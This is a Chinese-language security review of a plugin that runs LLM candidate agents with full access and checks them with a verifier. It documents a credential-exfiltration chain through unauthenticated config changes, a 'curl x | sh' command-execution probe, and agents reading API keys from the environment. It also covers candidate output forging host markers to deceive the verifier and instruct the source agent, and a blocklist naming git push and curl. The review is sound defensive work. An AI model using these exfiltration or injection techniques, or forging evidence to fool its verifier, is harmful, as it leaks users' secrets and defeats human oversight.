# R1 审查报告：信任边界与执行安全

- 基线：`6fb4462`（main），审查分支 `arena/01a0d1de-dsh-verifier-autopilot`
- 计划：`docs/REVIEW-PLAN-2026-09-24.md` §R1
- 回归测试：`scripts/tests/trust-boundary.test.mjs`（7 个测试，一条发现至少对应一条断言）
- 门禁：`check:architecture`、`typecheck`、`build:host`、`build:client` 全绿；`npm test` **260/260**（基线 253，新增 7）；`bridge/self_test.py` 13 PASS / 1 SKIP；`git diff --check` 干净

## 1. 威胁模型

| 入口（不可信程度） | 能到达的高权限动作 | 本轮之前的控制 | 本轮之后的控制 |
|---|---|---|---|
| 本机 HTTP 控制面（任意本机进程；浏览器里任意网页的跨站请求） | 改配置、启动/取消/丢弃 selection、花 provider 额度、让 `/probe` 带着密钥出站 | token 可选且默认不设；只有 3/8 个 POST 路由校验 content-type | 所有 POST 共用一个准入门（鉴权 → 拒绝跨站 → 必须 JSON）；特权配置字段只能走 settings 或 token；GUI 能携带 token |
| 候选 agent（LLM 生成的动作，全权限、无需审批） | 读写文件系统、联网、执行任意命令 | 只有 cwd 隔离（worktree）加提示词；准入黑名单只看任务文本 | 不变（产品决策，见 §4）。涉及远程写入的任务不再准入 autopilot |
| 候选写出的代码（被检查命令执行，如 `npm test`） | 读取宿主进程的所有环境变量，包括 provider key | 无，完整继承 `process.env` | 看起来像凭据的变量和配置里的 `apiKeyEnv` 一律不传 |
| 候选输出的文本（轨迹、handoff） | 对 verifier 伪造“runner 采集的证据”，对源 agent 伪造“结束候选块 + finalizer 合同” | 只在提示词里写一句“不可信” | Host 自己使用的段落标记在不可信文本里全部被改写失效 |
| `/select` 请求体 | 在任意目录跑候选；NaN 超时；无上限的准则进入每一次比较 | 部分字段有校验 | 标量字段、路径、准则规模全部校验 |

资产：provider 凭据及宿主上的其他密钥（GitHub、云厂商等）、用户源仓库、宿主进程目录、provider 额度、源会话的指令完整性。

## 2. 发现与处置

| # | 严重度 | 发现 | 处置 | 位置 |
|---|---|---|---|---|
| 1.4 | **高** | 未鉴权的 `POST /config` 可以同时改 `apiKeyEnv`（例如改成 `GITHUB_TOKEN`）和 `baseURL`（改成攻击者主机）；之后 `/probe`、autopilot 探活和 verifier lane 会把这个变量的值当 Bearer 发出去，构成凭据外泄链 | **已修复**。HTTP 调用方只能选择内置的端点组合（`MODEL_OPTIONS` 加默认值，这正是 GUI 下拉框发送的内容）；其他组合返回 403 `privileged-config-field:egress-target`，除非配置了 token 且请求携带 | `api.ts httpConfigPolicyViolation` |
| 1.5 | **高** | `POST /config` 可以设置 `selectionPostAuditTestCommand`，下一次源会话 idle 时这条命令会**在用户仓库里**执行，等于配置即命令执行。代码注释写的是“never runs on the user's repository”，与实现相反 | **已修复**。HTTP 设置非空值返回 403（清空始终允许）；settings 渠道不受影响；注释已改正；该命令执行时同样剔除凭据变量 | `api.ts`、`host.ts cleanupAutopilotWinnersOnce` |
| 1.6 | 中高 | `/verify`、`/probe`、`/selections/cancel`、`/release`、`/discard` 不校验 content-type，`text/plain` 简单请求可以被任意网页跨站触发（花额度、取消运行、删除 winner 工作区）。计划里只列了前两个，审查时又发现 3 个 | **已修复**。8 个 POST 路由共用 `mutationRefusal`：鉴权 → `Sec-Fetch-Site: cross-site` 返回 403 → 非 JSON 返回 415 | `api.ts` |
| 1.3 | 中 | 设置 `DSH_VA_API_TOKEN` 后，GUI 从不发送 Authorization，面板的所有写操作都返回 403，所以 token 实际不可用 | **已修复**。客户端改为统一走 `postJson`：第一次收到 403 `unauthorized` 时提示输入 token，存进 localStorage 后重试；不设 token 时请求和原来完全一样 | `client/index.ts` |
| 1.2 | **高** | 检查命令和交付审计的 `runProcess` 完整继承 `process.env`。检查执行的是候选自己写的代码，候选只要在测试里读 `process.env.KIMI_API_KEY` 就能拿到 key | **已修复**。`scrubSecretEnv` 按下划线分段匹配 KEY、TOKEN、SECRET、PASSWORD、CREDENTIAL、AUTH 等名称，外加显式传入的 `apiKeyEnv`；PATH、HOME、代理、locale 保留 | `proc.ts`、`checks.ts`、`candidates.ts`、`host.ts` |
| 1.8 | 中高 | 候选文本可以伪造 `[DETERMINISTIC EVIDENCE — collected by the runner…]` 来骗 verifier；handoff 里写 `[END CANDIDATE c1]`、`[FINALIZER CONTRACT]` 就能提前结束候选块并对源 agent 下指令 | **已修复**。`neutralizeControlMarkers` 把 Host 的 12 种段落标记改写成 `[UNTRUSTED-QUOTE: …`，内容保留、可读，且幂等。应用于 `renderTrajectory` 的输出（verifier 载荷和 handoff 都经过这里）、relay 的 handoff 和 note（覆盖旧 ledger 里读回的记录），以及候选上下文中的近期对话 | `trajectory.ts`、`autopilot.ts` |
| 1.1 | **高**（设计） | autopilot 候选以 `danger-full-access` 加 approval=never 运行，隔离只有 cwd，“不要做外部副作用”只写在提示词里。`EXTERNAL_SIDE_EFFECT` 准入黑名单漏掉了 `git push`、PR、`npm publish`、`curl`、`kubectl`、`terraform apply` 等。这类任务会被 N 个候选**各执行一次** | **部分修复**。新增 `REMOTE_SIDE_EFFECT` 准入规则（中英文），命中的任务交给单一源 agent 处理。沙箱模式本身属于产品决策，**待负责人拍板**，见 §4 | `autopilot.ts` |
| 1.7 | 中 | `/select` 接受相对路径或不存在的 `sourceCwd`（相对路径会按宿主进程 cwd 解析，正是 2026-09-13 事故里被破坏的目录）；check `timeoutMs: "soon"` 会变成 NaN；`agentPreset`、`groundTruthNote`、`algorithmSeed`、route 字段不校验；准则条数和长度无上限 | **已修复**。`validateStartScalars`、`safeSourceCwd` 和准则上限（≤ 8 条，名称 ≤ 80 字符，描述 ≤ 2000 字符）都在准入前执行，失败返回 400 和稳定的错误码 | `selection/host.ts` |
| 1.9 | 中（隐私） | 默认 `baseURL` 是第三方免费中转 `chat.holisthoom.top`，开箱即把源代码轨迹和 key 发给第三方 | **待决策**。改默认值属于产品决策；本轮只让它不能被 HTTP 改成任意值 | `config.ts` |
| 1.10 | 低 | `/eval` 允许单次请求覆盖 `allowLabelFallback` | **书面接受**。只影响这一次诊断评估的返回值，不持久化，也不进入 selection 决策 | `api.ts` |

## 3. 修复前后的行为证据

用同一个探测脚本分别跑基线构建和修复后的构建，只使用两边都存在的 API：

| 探测 | 基线 6fb4462 | 修复后 |
|---|---|---|
| `POST /config {baseURL: attacker, apiKeyEnv: GITHUB_TOKEN}` | **200**，apiKeyEnv 变为 GITHUB_TOKEN | 403，配置不变 |
| `POST /config {selectionPostAuditTestCommand: "curl x \| sh"}` | **200** | 403 |
| `POST /selections/cancel`，content-type 为 text/plain | **200**（已取消） | 415 |
| 检查命令 `printf %s "$R1_PROBE_TOKEN"` | **输出 "leak"** | 输出 "" |
| relay 中 handoff 伪造 `[FINALIZER CONTRACT]` 后，该标题出现次数 | **2** | 1 |
| verifier 载荷中是否出现伪造的 `[DETERMINISTIC EVIDENCE` | **是** | 否 |
| 任务 “Fix … and git push to origin” 是否准入 autopilot | **准入** | 拒绝（external-side-effect-risk） |
| `/select sourceCwd: "relative/dir"` | **接受并开始运行** | 400 source-cwd-invalid |
| `/select checks[].timeoutMs: "soon"` | **接受并开始运行** | 400 check-timeout-invalid |

## 4. 残余风险与待决策项

| 项 | 说明 | 建议 | 归属 |
|---|---|---|---|
| 候选沙箱（1.1） | 候选 agent 在 DSH 运行时里执行工具，插件无法限制它的文件系统、网络和环境变量。DSH 的工具执行继承宿主环境，所以**候选 agent 本身仍能读到 provider key**；本轮只剔除了检查和审计进程的凭据 | ① 在 P1 效果基线出来之前把 `selectionMode` 默认改为 `off`（见 R7）；② 向 DSH 要一个能配置 env 和网络的沙箱档位；③ 在此之前把这条风险写进 README 的醒目位置 | **负责人决策** |
| 默认第三方中转（1.9） | 同上 | 默认 baseURL 改为空或官方端点，由首次配置向导显式选择 | **负责人决策** |
| DNS rebinding | 攻击者域名重绑到 127.0.0.1 后就成了“同源”，可以绕过跨站拒绝和 content-type 门。插件看不到 DSH web server 的 Host 头策略 | 设置 `DSH_VA_API_TOKEN`（本轮已使其可用）；或由 DSH web server 做 Host 白名单 | 运维 / DSH |
| token 存放在 localStorage | 同源的任何脚本都能读到 | 本机单用户场景可以接受；多用户场景应改用 DSH 的会话鉴权 | 书面接受 |
| 检查命令需要凭据的场景 | 检查如果依赖私有 registry token，现在会失败 | 属于有意为之：检查应当离线自包含；确有需要时应在 DSH 之外预置凭据文件 | 书面接受 |
| selection 路径的出口不脱敏 | 候选轨迹发给 sidecar、审计包和 relay 时都没有 `redactSecrets` | 转 **R5** | R5 |
| harness-error 可被候选输出伪造 | 已在计划中复现 | 转 **R2** | R2 |
| legacy 路径的提示注入 | 源会话自身的工具结果可以伪造 `[EXTRACTED TOOL EVIDENCE]`，但威胁比候选低（内容来自用户自己的会话） | 转 **R8** 统一复核 | R8 |

## 5. 兼容性影响（合并前需要知道）

1. 通过 HTTP 把 `baseURL`/`apiKeyEnv` 设成内置预设以外的值，或设置非空的 `selectionPostAuditTestCommand`，现在返回 403。改走 DSH settings，或者配置并携带 token。GUI 的模型下拉只发送预设值，不受影响。
2. 所有 POST 必须带 `content-type: application/json`。GUI、测试和 HANDOFF 里记录的 curl 用法本来就满足。
3. `/select` 的畸形字段现在直接返回 400，不再被静默接受。
4. 带有 push、PR、publish、curl 等远程动作的任务不再触发 autopilot，由源 agent 单独完成。
5. 检查命令里读不到 `*_TOKEN`、`*_KEY` 这类变量。
